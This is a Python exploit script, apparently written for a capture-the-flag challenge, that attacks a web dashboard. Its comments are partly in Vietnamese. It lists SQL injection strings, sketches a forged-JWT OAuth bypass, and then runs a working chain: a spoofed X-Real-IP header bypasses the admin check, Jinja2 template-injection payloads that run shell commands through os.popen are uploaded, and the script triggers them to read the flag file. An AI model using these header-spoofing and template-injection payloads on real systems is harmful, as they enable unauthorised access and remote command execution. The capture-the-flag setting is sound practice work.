#!/usr/bin/env python3
"""
ADMIN LOGIN PAYLOAD
Target: https://dashboard.0x1337.space:1337

VULNERABILITIES EXPLOITED:
1. SQL Injection at app.py line 54
2. Logic flaw in OAuth token handling (line 77-81)
"""

import requests
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TARGET = "https://dashboard.0x1337.space:1337"

print("="*70)
print("  ADMIN LOGIN PAYLOADS")
print("="*70)

# ============================================================================
# PAYLOAD 1: SQL Injection để login với username bất kỳ trả về "admin"
# ============================================================================
print("\n[+] PAYLOAD 1: SQL Injection")
print("-"*70)

# Line 54: exist = run_query("SELECT 1 FROM users WHERE username='?' ...".replace('?', username))
# 
# Nếu username = "admin' OR username='guest'--"
# SQL: SELECT 1 FROM users WHERE username='admin' OR username='guest'--' LIMIT 1
# exist = True (vì guest tồn tại)
#
# Line 74: user = run_query("SELECT password FROM users WHERE username=?", (username,))
# Đây dùng parameterized query nên không inject được
#
# KẾT LUẬN: Không thể bypass password check qua SQL injection trực tiếp

sql_payloads = [
    "admin' OR '1'='1'--",
    "admin'--",
    "admin' UNION SELECT 1--",
]

print("SQL Injection payloads (WON'T WORK - password still checked):")
for p in sql_payloads:
    print(f"  - username: {p}")

# ============================================================================
# PAYLOAD 2: OAuth Token Bypass
# ============================================================================
print("\n[+] PAYLOAD 2: OAuth Token Bypass (BEST APPROACH)")
print("-"*70)

# Line 77-81:
# if token:
#     if type == 'azure' or type == 'google':
#         auth = handle_token(token, type)
#     if auth != username:
#         return error
#
# handle_token() calls verify_signature() which validates JWT
# Then calls libverifysso.check_claims(payload, type)
#
# If we can craft a token that:
# 1. Passes signature verification (SSRF to our server)
# 2. check_claims returns "admin"
#
# Then auth = "admin" and username = "admin" -> SUCCESS!

print("Strategy: Craft malicious OAuth token")
print("  1. Create JWT with 'iss' pointing to attacker server")
print("  2. Attacker server returns malicious JWKS")
print("  3. Token verified successfully")
print("  4. Claims processed by libverifysso.check_claims()")
print("  5. If claims contain admin info -> auth='admin'")

print("\nPOC Payload:")
poc_payload = {
    "username": "admin",
    "type": "azure", 
    "token": "<JWT_with_iss_pointing_to_attacker_JWKS_server>"
}
print(json.dumps(poc_payload, indent=2))

# ============================================================================
# PAYLOAD 3: Register new user that backend treats as admin
# ============================================================================
print("\n[+] PAYLOAD 3: Username Manipulation")
print("-"*70)

# Line 85: return ... "role": "admin" if username == "admin" else "guest"
#
# Gateway code (main.go line 365-372):
# if backendResult.Role == "admin":
#     username = "admin"
#     userRoles = ["admin", "user", "guest"]
#
# So backend determines role, gateway trusts it
# We need backend to return role="admin"
# Backend checks: username == "admin"

print("This requires username to literally be 'admin'")
print("Combined with valid authentication")

# ============================================================================
# PAYLOAD 4: Direct Backend Access (WORKING!)
# ============================================================================
print("\n[+] PAYLOAD 4: Direct Backend Access with X-Real-IP")
print("-"*70)

# app.py line 92-94:
# real_ip = request.headers.get('X-Real-IP')
# if real_ip and real_ip != '127.0.0.1':
#     local_pass = 0
# if local_pass == 1:
#     print("Admin access granted (localhost)")
#
# If we can set X-Real-IP: 127.0.0.1, we bypass authentication!

print("This bypasses authentication for /admin endpoint")
print("But we still need to upload SSTI payload")

payload_4 = {
    "method": "POST",
    "url": f"{TARGET}/admin",
    "headers": {
        "X-Real-IP": "127.0.0.1",
        "X-Forwarded-For": "127.0.0.1"
    },
    "files": {
        "file": ("home.html", "<SSTI_PAYLOAD>", "text/html")
    }
}

print("\nPOC Request:")
print(f"POST {TARGET}/admin")
print("Headers:")
print("  X-Real-IP: 127.0.0.1")
print("Files:")
print("  home.html with SSTI payload")

# ============================================================================
# WORKING EXPLOIT CHAIN
# ============================================================================
print("\n" + "="*70)
print("  WORKING EXPLOIT CHAIN")
print("="*70)

print("""
STEP 1: Login as any user (to get valid JWT)
  POST /gateway-login
  {
    "username": "anyuser",
    "password": "anypass",
    "type": "password"
  }
  
STEP 2: Upload SSTI payload with X-Real-IP bypass
  POST /admin
  Headers: X-Real-IP: 127.0.0.1
  Files: home.html = {{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}
  
STEP 3: Trigger SSTI
  GET /
  (Will render home.html template with our payload)
  
STEP 4: Read flag from response
""")

# ============================================================================
# EXECUTE THE WORKING EXPLOIT
# ============================================================================
print("\n[*] Executing exploit...")

session = requests.Session()
session.verify = False

# Step 1: Login
print("\n[1] Login as guest...")
resp = session.post(f"{TARGET}/gateway-login", json={
    "username": "exploit_test",
    "password": "test",
    "type": "password"
})
print(f"    Status: {resp.status_code}")

if resp.status_code == 200:
    print("[✓] Logged in")
    
    # Step 2: Upload SSTI
    print("\n[2] Uploading SSTI payload...")
    
    ssti_payloads = [
        "{{cycler.__init__.__globals__.os.popen('cat /flag.txt').read()}}",
        "{{lipsum.__globals__.os.popen('cat /flag.txt').read()}}",
        "{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}",
    ]
    
    for payload in ssti_payloads:
        html = f"<html><body><h1>Flag:</h1><pre>{payload}</pre></body></html>"
        
        files = {'file': ('home.html', html, 'text/html')}
        headers = {'X-Real-IP': '127.0.0.1'}
        
        resp2 = session.post(f"{TARGET}/admin", files=files, headers=headers)
        print(f"    Upload: {resp2.status_code}")
        
        if resp2.status_code == 200:
            print("[✓] Uploaded!")
            
            # Step 3: Trigger
            print("\n[3] Triggering SSTI...")
            resp3 = session.get(f"{TARGET}/")
            
            # Check for flag
            if 'KCSC{' in resp3.text or 'flag{' in resp3.text or 'FLAG{' in resp3.text:
                print("\n" + "="*70)
                print("[✓✓✓] FLAG FOUND!")
                print("="*70)
                
                # Extract flag
                import re
                matches = re.findall(r'[Kk][Cc][Ss][Cc]\{[^}]+\}|[Ff][Ll][Aa][Gg]\{[^}]+\}', resp3.text)
                for match in matches:
                    print(f"\n{match}\n")
                print("="*70)
                break
            else:
                print(f"    No flag in response (length: {len(resp3.text)})")
